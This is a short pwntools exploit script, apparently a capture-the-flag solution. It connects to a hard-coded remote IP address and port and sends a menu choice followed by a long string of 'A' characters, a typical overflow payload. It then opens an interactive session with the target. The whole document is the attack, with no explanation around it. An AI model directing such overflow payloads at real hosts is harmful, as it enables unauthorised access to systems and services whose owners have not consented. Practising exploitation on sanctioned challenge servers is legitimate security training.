from pwn import *

p = remote("34.87.186.254", 21212)

p.sendline(b"1 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA")

p.interactive()
